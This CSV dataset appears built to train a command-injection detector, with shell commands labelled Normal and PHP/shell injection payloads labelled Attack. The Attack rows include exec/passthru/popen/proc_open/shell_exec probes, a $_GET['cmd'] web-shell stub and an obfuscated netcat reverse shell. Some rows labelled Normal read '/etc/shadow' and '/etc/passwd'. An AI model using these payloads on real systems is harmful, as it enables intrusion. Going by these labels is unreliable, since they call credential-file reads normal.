Content,Category,Label
let me know about the laundry../bin & cleaning supplies,cmdexe2,Normal
ls -lh /var/log,cmdexe2,Normal
whoami,cmdexe2,Normal
cat /etc/passwd,cmdexe2,Normal
ps aux | grep nginx,cmdexe2,Normal
uptime,cmdexe2,Normal
df -h,cmdexe2,Normal
netstat -tulnp,cmdexe2,Normal
systemctl status ssh,cmdexe2,Normal
hostname -I,cmdexe2,Normal
top -n 1,cmdexe2,Normal
"echo ""Health Check Passed""",cmdexe2,Normal
free -m,cmdexe2,Normal
chmod 755 /usr/local/bin/script.sh,cmdexe2,Normal
rm -rf /tmp/tempfile,cmdexe2,Normal
mkdir /opt/app/logs,cmdexe2,Normal
chown www-data:www-data /var/www/html,cmdexe2,Normal
ls -la /home/user,cmdexe2,Normal
du -sh *,cmdexe2,Normal
ifconfig,cmdexe2,Normal
id,cmdexe2,Normal
uname -a,cmdexe2,Normal
touch /tmp/monitor.txt,cmdexe2,Normal
service apache2 restart,cmdexe2,Normal
kill -9 1234,cmdexe2,Normal
ping -c 4 8.8.8.8,cmdexe2,Normal
curl -I https://example.com,cmdexe2,Normal
mv index.html index_old.html,cmdexe2,Normal
cp config.cfg config.bak,cmdexe2,Normal
tail -n 20 /var/log/syslog,cmdexe2,Normal
journalctl -xe,cmdexe2,Normal
df -T,cmdexe2,Normal
"echo ""Ready""",cmdexe2,Normal
lsblk,cmdexe2,Normal
ip addr show,cmdexe2,Normal
groupadd developers,cmdexe2,Normal
usermod -aG sudo user1,cmdexe2,Normal
passwd --status user1,cmdexe2,Normal
wget http://example.com/file.txt,cmdexe2,Normal
date,cmdexe2,Normal
env,cmdexe2,Normal
logrotate /etc/logrotate.conf,cmdexe2,Normal
sync,cmdexe2,Normal
uptime && w,cmdexe2,Normal
who,cmdexe2,Normal
groups,cmdexe2,Normal
getent passwd,cmdexe2,Normal
locate nginx.conf,cmdexe2,Normal
lsattr /bin/bash,cmdexe2,Normal
lsmod,cmdexe2,Normal
ls -alh /opt/,cmdexe2,Normal
whoami,cmdexe2,Normal
cat /etc/shadow,cmdexe2,Normal
ps -ef | grep apache,cmdexe2,Normal
uptime,cmdexe2,Normal
df -i,cmdexe2,Normal
netstat -anp,cmdexe2,Normal
systemctl status nginx,cmdexe2,Normal
hostname,cmdexe2,Normal
top -b -n1 | head -20,cmdexe2,Normal
"echo ""OK""",cmdexe2,Normal
free -h,cmdexe2,Normal
chmod 700 /root/backup.sh,cmdexe2,Normal
rm -rf /var/tmp/cache,cmdexe2,Normal
mkdir -p /srv/data/logs,cmdexe2,Normal
chown root:root /etc/hosts,cmdexe2,Normal
ls -l /usr/bin,cmdexe2,Normal
du -ah /home/user,cmdexe2,Normal
ifconfig -a,cmdexe2,Normal
id -u,cmdexe2,Normal
uname -mrs,cmdexe2,Normal
touch /tmp/testfile,cmdexe2,Normal
service mysql status,cmdexe2,Normal
killall -9 java,cmdexe2,Normal
ping -c 2 1.1.1.1,cmdexe2,Normal
curl -s https://test.com,cmdexe2,Normal
mv settings.conf settings_old.conf,cmdexe2,Normal
cp .env .env.backup,cmdexe2,Normal
tail -f /var/log/nginx/access.log,cmdexe2,Normal
journalctl -u ssh.service,cmdexe2,Normal
df -hT,cmdexe2,Normal
lsblk -f,cmdexe2,Normal
ip link show,cmdexe2,Normal
groupdel tempgroup,cmdexe2,Normal
usermod -L tempuser,cmdexe2,Normal
passwd -l tempuser,cmdexe2,Normal
wget https://example.org/test.zip,cmdexe2,Normal
"date +""%F %T""",cmdexe2,Normal
env | sort,cmdexe2,Normal
logrotate -d /etc/logrotate.conf,cmdexe2,Normal
sync; echo 3 > /proc/sys/vm/drop_caches,cmdexe2,Normal
who -u,cmdexe2,Normal
getent group sudo,cmdexe2,Normal
locate php.ini,cmdexe2,Normal
lsattr -d /etc/passwd,cmdexe2,Normal
lsmod | grep fuse,cmdexe2,Normal
$aaaaaa/bin$bbbbbb/cat$ccccccc $dddddd/etc$eeeeeee/passwd$fffffff,cmdexe2,Attack
$(`cat /etc/passwd`),cmdexe2,Attack
$(`dir`),cmdexe2,Attack
$(echo SYCGSY > SYCGSY.txt),cmdexe2,Attack
${exec(print(`echo AOJPQW\necho $((18+92))\necho AOJPQW\necho AOJPQW`);%252529%25257DAOJPQW,cmdexe2,Attack
${exec(print(`echo ASBMQM;echo $((65+46));echo ASBMQM;echo ASBMQM`);#ASBMQM,cmdexe2,Attack
${exec(print(`echo BDBPSZ;echo $((87+50));echo BDBPSZ;echo BDBPSZ`);BDBPSZ,cmdexe2,Attack
"${exec(print(`echo BGHSSE`.`echo $((10+79))`.`echo BGHSSE`.`echo BGHSSE`);.""BGHSSE",cmdexe2,Attack
${exec(print(`echo CHWXXR;echo $((19+13));echo CHWXXR;echo CHWXXR`);.'CHWXXR,cmdexe2,Attack
${exec(print(`echo CPYIZR%0aecho $((58+63))%0aecho CPYIZR%0aecho CPYIZR`);//CPYIZR,cmdexe2,Attack
${exec(print(`echo GKZRWD`.`echo $((93+76))`.`echo GKZRWD`.`echo GKZRWD`);#GKZRWD,cmdexe2,Attack
"${exec(print(`echo GYABGY;echo $((9+52));echo GYABGY;echo GYABGY`);.""GYABGY",cmdexe2,Attack
${exec(print(`echo HFMDNB%0aecho $((56+41))%0aecho HFMDNB%0aecho HFMDNB`);.%2522HFMDNB,cmdexe2,Attack
${exec(print(`echo HIUMZJ`.`echo $((69+37))`.`echo HIUMZJ`.`echo HIUMZJ`);HIUMZJ,cmdexe2,Attack
${exec(print(`echo IHGVIP;echo $((98+57));echo IHGVIP;echo IHGVIP`);)}IHGVIP,cmdexe2,Attack
${exec(print(`echo ITAGSP\necho $((63+35))\necho ITAGSP\necho ITAGSP`);ITAGSP,cmdexe2,Attack
${exec(print(`echo JFZDGZ`.`echo $((16+38))`.`echo JFZDGZ`.`echo JFZDGZ`);\\JFZDGZ,cmdexe2,Attack
${exec(print(`echo JPKQMC\necho $((63+12))\necho JPKQMC\necho JPKQMC`);.%252527JPKQMC,cmdexe2,Attack
${exec(print(`echo KTGGNJ\necho $((80+87))\necho KTGGNJ\necho KTGGNJ`);.%252522KTGGNJ,cmdexe2,Attack
${exec(print(`echo LWNHYJ%0aecho $((0+21))%0aecho LWNHYJ%0aecho LWNHYJ`);%2529%257DLWNHYJ,cmdexe2,Attack
${exec(print(`echo OHFTIA%0aecho $((97+31))%0aecho OHFTIA%0aecho OHFTIA`);.%2527OHFTIA,cmdexe2,Attack
${exec(print(`echo QRLVMM\necho $((41+19))\necho QRLVMM\necho QRLVMM`);%25255C%25255CQRLVMM,cmdexe2,Attack
${exec(print(`echo QTLCRD%0aecho $((90+5))%0aecho QTLCRD%0aecho QTLCRD`);%255C%255CQTLCRD,cmdexe2,Attack
${exec(print(`echo SRPMSX`.`echo $((59+33))`.`echo SRPMSX`.`echo SRPMSX`))}SRPMSX,cmdexe2,Attack
${exec(print(`echo TWZNTZ\necho $((85+67))\necho TWZNTZ\necho TWZNTZ`);%252523TWZNTZ,cmdexe2,Attack
${exec(print(`echo UFJNMU\necho $((69+30))\necho UFJNMU\necho UFJNMU`);//UFJNMU,cmdexe2,Attack
${exec(print(`echo UGDXMC`.`echo $((12+69))`.`echo UGDXMC`.`echo UGDXMC`);.'UGDXMC,cmdexe2,Attack
${exec(print(`echo UVBBNB%0aecho $((5+32))%0aecho UVBBNB%0aecho UVBBNB`);UVBBNB,cmdexe2,Attack
${exec(print(`echo UZNHTA%0aecho $((79+41))%0aecho UZNHTA%0aecho UZNHTA`);%2523UZNHTA,cmdexe2,Attack
${exec(print(`echo XRESBN`.`echo $((9+10))`.`echo XRESBN`.`echo XRESBN`);//XRESBN,cmdexe2,Attack
${exec(print(`echo YFVAOJ;echo $((71+65));echo YFVAOJ;echo YFVAOJ`);//YFVAOJ,cmdexe2,Attack
${exec(print(`echo YYMYQB;echo $((54+65));echo YYMYQB;echo YYMYQB`);\\YYMYQB,cmdexe2,Attack
";{$_GET[""cmd""]}",cmdexe2,Attack
$(`ls`),cmdexe2,Attack
${passthru(print(`echo CGIUOF`.`echo $((1+49))`.`echo CGIUOF`.`echo CGIUOF`);\\CGIUOF,cmdexe2,Attack
${passthru(print(`echo CLQQRV;echo $((21+24));echo CLQQRV;echo CLQQRV`);CLQQRV,cmdexe2,Attack
${passthru(print(`echo CSYNWP\necho $((93+10))\necho CSYNWP\necho CSYNWP`);.%252522CSYNWP,cmdexe2,Attack
${passthru(print(`echo CYGOXX;echo $((41+31));echo CYGOXX;echo CYGOXX`);)}CYGOXX,cmdexe2,Attack
${passthru(print(`echo DAORGO`.`echo $((65+75))`.`echo DAORGO`.`echo DAORGO`))}DAORGO,cmdexe2,Attack
${passthru(print(`echo DBDIBN;echo $((7+5));echo DBDIBN;echo DBDIBN`);//DBDIBN,cmdexe2,Attack
${passthru(print(`echo EGTRQH\necho $((17+5))\necho EGTRQH\necho EGTRQH`);.%252527EGTRQH,cmdexe2,Attack
${passthru(print(`echo EWDATZ\necho $((58+44))\necho EWDATZ\necho EWDATZ`);//EWDATZ,cmdexe2,Attack
${passthru(print(`echo FHTLVG%0aecho $((8+87))%0aecho FHTLVG%0aecho FHTLVG`);%2523FHTLVG,cmdexe2,Attack
"${passthru(print(`echo HRCXNG;echo $((6+10));echo HRCXNG;echo HRCXNG`);.""HRCXNG",cmdexe2,Attack
${passthru(print(`echo JRXXWA;echo $((92+68));echo JRXXWA;echo JRXXWA`);\\JRXXWA,cmdexe2,Attack
${passthru(print(`echo KRUYIM%0aecho $((16+77))%0aecho KRUYIM%0aecho KRUYIM`);.%2522KRUYIM,cmdexe2,Attack
${passthru(print(`echo KXVPHA%0aecho $((20+43))%0aecho KXVPHA%0aecho KXVPHA`);%255C%255CKXVPHA,cmdexe2,Attack
${passthru(print(`echo NLYULT`.`echo $((55+80))`.`echo NLYULT`.`echo NLYULT`);NLYULT,cmdexe2,Attack
${passthru(print(`echo NSBWMT%0aecho $((16+44))%0aecho NSBWMT%0aecho NSBWMT`);//NSBWMT,cmdexe2,Attack
${passthru(print(`echo OAAISJ`.`echo $((72+52))`.`echo OAAISJ`.`echo OAAISJ`);#OAAISJ,cmdexe2,Attack
${passthru(print(`echo OLJESC\necho $((53+40))\necho OLJESC\necho OLJESC`);%25255C%25255COLJESC,cmdexe2,Attack
${passthru(print(`echo OSWWFT%0aecho $((92+42))%0aecho OSWWFT%0aecho OSWWFT`);%2529%257DOSWWFT,cmdexe2,Attack
${passthru(print(`echo OVSNXT\necho $((21+17))\necho OVSNXT\necho OVSNXT`);%252529%25257DOVSNXT,cmdexe2,Attack
${passthru(print(`echo PYELUB;echo $((29+64));echo PYELUB;echo PYELUB`);#PYELUB,cmdexe2,Attack
${passthru(print(`echo QKCAAG%0aecho $((61+22))%0aecho QKCAAG%0aecho QKCAAG`);.%2527QKCAAG,cmdexe2,Attack
${passthru(print(`echo QPYRBQ\necho $((35+79))\necho QPYRBQ\necho QPYRBQ`);%252523QPYRBQ,cmdexe2,Attack
${passthru(print(`echo RBCHID`.`echo $((71+83))`.`echo RBCHID`.`echo RBCHID`);.'RBCHID,cmdexe2,Attack
${passthru(print(`echo TYDNLL%0aecho $((23+29))%0aecho TYDNLL%0aecho TYDNLL`);TYDNLL,cmdexe2,Attack
"${passthru(print(`echo UOUNQT`.`echo $((2+66))`.`echo UOUNQT`.`echo UOUNQT`);.""UOUNQT",cmdexe2,Attack
${passthru(print(`echo XGEVDG`.`echo $((58+30))`.`echo XGEVDG`.`echo XGEVDG`);//XGEVDG,cmdexe2,Attack
${passthru(print(`echo XUWNEP;echo $((61+20));echo XUWNEP;echo XUWNEP`);.'XUWNEP,cmdexe2,Attack
${passthru(print(`echo ZKPFXS\necho $((3+17))\necho ZKPFXS\necho ZKPFXS`);ZKPFXS,cmdexe2,Attack
{${phpinfo()}},cmdexe2,Attack
${popen(print(`echo AHQLIX%0aecho $((35+21))%0aecho AHQLIX%0aecho AHQLIX`);//AHQLIX,cmdexe2,Attack
${popen(print(`echo ATLEFF;echo $((90+9));echo ATLEFF;echo ATLEFF`);\\ATLEFF,cmdexe2,Attack
${popen(print(`echo BZEAYT%0aecho $((11+35))%0aecho BZEAYT%0aecho BZEAYT`);.%2527BZEAYT,cmdexe2,Attack
${popen(print(`echo BZLGPL;echo $((70+63));echo BZLGPL;echo BZLGPL`);)}BZLGPL,cmdexe2,Attack
${popen(print(`echo FJKMCS\necho $((43+2))\necho FJKMCS\necho FJKMCS`);.%252522FJKMCS,cmdexe2,Attack
"${popen(print(`echo FRWTRM;echo $((11+41));echo FRWTRM;echo FRWTRM`);.""FRWTRM",cmdexe2,Attack
${popen(print(`echo IWFPXG;echo $((92+70));echo IWFPXG;echo IWFPXG`);IWFPXG,cmdexe2,Attack
${popen(print(`echo JDFWVW%0aecho $((92+86))%0aecho JDFWVW%0aecho JDFWVW`);%255C%255CJDFWVW,cmdexe2,Attack
${popen(print(`echo KCHOPX\necho $((77+78))\necho KCHOPX\necho KCHOPX`);%252523KCHOPX,cmdexe2,Attack
${popen(print(`echo LBEVLL`.`echo $((2+31))`.`echo LBEVLL`.`echo LBEVLL`))}LBEVLL,cmdexe2,Attack
${popen(print(`echo LSIFOR%0aecho $((86+39))%0aecho LSIFOR%0aecho LSIFOR`);.%2522LSIFOR,cmdexe2,Attack
${popen(print(`echo MVEAQD;echo $((64+58));echo MVEAQD;echo MVEAQD`);.'MVEAQD,cmdexe2,Attack
${popen(print(`echo PBSYUK`.`echo $((49+23))`.`echo PBSYUK`.`echo PBSYUK`);//PBSYUK,cmdexe2,Attack
"${popen(print(`echo PBZYGX`.`echo $((38+4))`.`echo PBZYGX`.`echo PBZYGX`);.""PBZYGX",cmdexe2,Attack
${popen(print(`echo QDXUDJ\necho $((17+75))\necho QDXUDJ\necho QDXUDJ`);%252529%25257DQDXUDJ,cmdexe2,Attack
${popen(print(`echo RWKSAH%0aecho $((18+34))%0aecho RWKSAH%0aecho RWKSAH`);RWKSAH,cmdexe2,Attack
${popen(print(`echo RWZIYD\necho $((45+92))\necho RWZIYD\necho RWZIYD`);//RWZIYD,cmdexe2,Attack
${popen(print(`echo SLXBWN%0aecho $((29+57))%0aecho SLXBWN%0aecho SLXBWN`);%2529%257DSLXBWN,cmdexe2,Attack
${popen(print(`echo TBFYMH\necho $((44+94))\necho TBFYMH\necho TBFYMH`);TBFYMH,cmdexe2,Attack
${popen(print(`echo UQCXVD\necho $((60+78))\necho UQCXVD\necho UQCXVD`);%25255C%25255CUQCXVD,cmdexe2,Attack
${popen(print(`echo UWOAFS%0aecho $((11+42))%0aecho UWOAFS%0aecho UWOAFS`);%2523UWOAFS,cmdexe2,Attack
${popen(print(`echo UYCUPP;echo $((99+36));echo UYCUPP;echo UYCUPP`);//UYCUPP,cmdexe2,Attack
${popen(print(`echo VDXXJI;echo $((50+12));echo VDXXJI;echo VDXXJI`);#VDXXJI,cmdexe2,Attack
${popen(print(`echo VGNVLG`.`echo $((76+39))`.`echo VGNVLG`.`echo VGNVLG`);VGNVLG,cmdexe2,Attack
${popen(print(`echo XGFDZU`.`echo $((14+6))`.`echo XGFDZU`.`echo XGFDZU`);#XGFDZU,cmdexe2,Attack
${popen(print(`echo XZRRJD`.`echo $((95+86))`.`echo XZRRJD`.`echo XZRRJD`);.'XZRRJD,cmdexe2,Attack
${popen(print(`echo YYAFET`.`echo $((62+68))`.`echo YYAFET`.`echo YYAFET`);\\YYAFET,cmdexe2,Attack
${popen(print(`echo ZTPGAU\necho $((52+3))\necho ZTPGAU\necho ZTPGAU`);.%252527ZTPGAU,cmdexe2,Attack
$(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev),cmdexe2,Attack
;${@print(md5(RCEVulnerable))};,cmdexe2,Attack
"${@print(""RCEVulnerable"")}",cmdexe2,Attack
${@print(system($_SERVER['HTTP_USER_AGENT']))},cmdexe2,Attack
${proc_open(print(`echo BBSVGQ`.`echo $((42+81))`.`echo BBSVGQ`.`echo BBSVGQ`);#BBSVGQ,cmdexe2,Attack
${proc_open(print(`echo BPIHJI%0aecho $((94+16))%0aecho BPIHJI%0aecho BPIHJI`);%2523BPIHJI,cmdexe2,Attack
${proc_open(print(`echo BUFRZN`.`echo $((99+37))`.`echo BUFRZN`.`echo BUFRZN`);\\BUFRZN,cmdexe2,Attack
${proc_open(print(`echo CPKMZS`.`echo $((71+91))`.`echo CPKMZS`.`echo CPKMZS`);.'CPKMZS,cmdexe2,Attack
${proc_open(print(`echo EALLNU`.`echo $((18+91))`.`echo EALLNU`.`echo EALLNU`))}EALLNU,cmdexe2,Attack
${proc_open(print(`echo EBZMPW\necho $((54+99))\necho EBZMPW\necho EBZMPW`);.%252522EBZMPW,cmdexe2,Attack
${proc_open(print(`echo FCANMP\necho $((61+35))\necho FCANMP\necho FCANMP`);FCANMP,cmdexe2,Attack
${proc_open(print(`echo GSEIBK\necho $((71+35))\necho GSEIBK\necho GSEIBK`);%252529%25257DGSEIBK,cmdexe2,Attack
${proc_open(print(`echo HEDLVC%0aecho $((95+18))%0aecho HEDLVC%0aecho HEDLVC`);//HEDLVC,cmdexe2,Attack
${proc_open(print(`echo HWBQFG;echo $((79+43));echo HWBQFG;echo HWBQFG`);.'HWBQFG,cmdexe2,Attack
${proc_open(print(`echo JQUEEX\necho $((81+77))\necho JQUEEX\necho JQUEEX`);.%252527JQUEEX,cmdexe2,Attack
${proc_open(print(`echo JXTIWP%0aecho $((97+60))%0aecho JXTIWP%0aecho JXTIWP`);.%2522JXTIWP,cmdexe2,Attack
${proc_open(print(`echo KDOEOK`.`echo $((74+18))`.`echo KDOEOK`.`echo KDOEOK`);//KDOEOK,cmdexe2,Attack
${proc_open(print(`echo KNDTDG\necho $((98+53))\necho KNDTDG\necho KNDTDG`);//KNDTDG,cmdexe2,Attack
"${proc_open(print(`echo KZLOGK`.`echo $((4+23))`.`echo KZLOGK`.`echo KZLOGK`);.""KZLOGK",cmdexe2,Attack
${proc_open(print(`echo LUFXAF;echo $((85+77));echo LUFXAF;echo LUFXAF`);#LUFXAF,cmdexe2,Attack
"${proc_open(print(`echo MLSOYZ;echo $((72+12));echo MLSOYZ;echo MLSOYZ`);.""MLSOYZ",cmdexe2,Attack
${proc_open(print(`echo RMMUOG;echo $((61+62));echo RMMUOG;echo RMMUOG`);)}RMMUOG,cmdexe2,Attack
${proc_open(print(`echo RTNMAU;echo $((3+92));echo RTNMAU;echo RTNMAU`);//RTNMAU,cmdexe2,Attack
${proc_open(print(`echo SKXDUS;echo $((67+97));echo SKXDUS;echo SKXDUS`);\\SKXDUS,cmdexe2,Attack
${proc_open(print(`echo SQZPMJ%0aecho $((94+63))%0aecho SQZPMJ%0aecho SQZPMJ`);%255C%255CSQZPMJ,cmdexe2,Attack
${proc_open(print(`echo SRVISB\necho $((34+18))\necho SRVISB\necho SRVISB`);%252523SRVISB,cmdexe2,Attack
${proc_open(print(`echo TDPGNL%0aecho $((89+52))%0aecho TDPGNL%0aecho TDPGNL`);.%2527TDPGNL,cmdexe2,Attack
${proc_open(print(`echo TIYJYD`.`echo $((86+26))`.`echo TIYJYD`.`echo TIYJYD`);TIYJYD,cmdexe2,Attack
${proc_open(print(`echo TWETUM%0aecho $((82+35))%0aecho TWETUM%0aecho TWETUM`);%2529%257DTWETUM,cmdexe2,Attack
${proc_open(print(`echo WMSMFM%0aecho $((4+30))%0aecho WMSMFM%0aecho WMSMFM`);WMSMFM,cmdexe2,Attack
${proc_open(print(`echo XAKQYF;echo $((41+51));echo XAKQYF;echo XAKQYF`);XAKQYF,cmdexe2,Attack
${proc_open(print(`echo ZMUKGP\necho $((9+61))\necho ZMUKGP\necho ZMUKGP`);%25255C%25255CZMUKGP,cmdexe2,Attack
${shell_exec(print(`echo BMQBVJ;echo $((82+52));echo BMQBVJ;echo BMQBVJ`);.'BMQBVJ,cmdexe2,Attack
${shell_exec(print(`echo CKFBET`.`echo $((33+76))`.`echo CKFBET`.`echo CKFBET`);.'CKFBET,cmdexe2,Attack
${shell_exec(print(`echo CTGKDZ`.`echo $((66+54))`.`echo CTGKDZ`.`echo CTGKDZ`);//CTGKDZ,cmdexe2,Attack
${shell_exec(print(`echo CVXUUB\necho $((15+41))\necho CVXUUB\necho CVXUUB`);//CVXUUB,cmdexe2,Attack
${shell_exec(print(`echo DPVESG%0aecho $((76+66))%0aecho DPVESG%0aecho DPVESG`);%2529%257DDPVESG,cmdexe2,Attack
${shell_exec(print(`echo EDDLOS;echo $((48+73));echo EDDLOS;echo EDDLOS`);//EDDLOS,cmdexe2,Attack
${shell_exec(print(`echo EINNUI;echo $((9+15));echo EINNUI;echo EINNUI`);#EINNUI,cmdexe2,Attack
${shell_exec(print(`echo FBJSWR%0aecho $((91+71))%0aecho FBJSWR%0aecho FBJSWR`);%2523FBJSWR,cmdexe2,Attack
${shell_exec(print(`echo FDGAHQ`.`echo $((87+87))`.`echo FDGAHQ`.`echo FDGAHQ`);FDGAHQ,cmdexe2,Attack
${shell_exec(print(`echo HULCYO%0aecho $((33+24))%0aecho HULCYO%0aecho HULCYO`);//HULCYO,cmdexe2,Attack
${shell_exec(print(`echo KIACLJ%0aecho $((8+79))%0aecho KIACLJ%0aecho KIACLJ`);.%2522KIACLJ,cmdexe2,Attack
${shell_exec(print(`echo KRLQHL\necho $((37+53))\necho KRLQHL\necho KRLQHL`);%25255C%25255CKRLQHL,cmdexe2,Attack
${shell_exec(print(`echo LTJDND\necho $((85+41))\necho LTJDND\necho LTJDND`);LTJDND,cmdexe2,Attack
${shell_exec(print(`echo MVSQEI;echo $((38+17));echo MVSQEI;echo MVSQEI`);\\MVSQEI,cmdexe2,Attack
${shell_exec(print(`echo NHQIAE\necho $((63+50))\necho NHQIAE\necho NHQIAE`);.%252522NHQIAE,cmdexe2,Attack
${shell_exec(print(`echo NSLPBW`.`echo $((95+54))`.`echo NSLPBW`.`echo NSLPBW`);\\NSLPBW,cmdexe2,Attack
${shell_exec(print(`echo NTILFZ%0aecho $((24+1))%0aecho NTILFZ%0aecho NTILFZ`);NTILFZ,cmdexe2,Attack
${shell_exec(print(`echo OAPDKW;echo $((19+47));echo OAPDKW;echo OAPDKW`);OAPDKW,cmdexe2,Attack
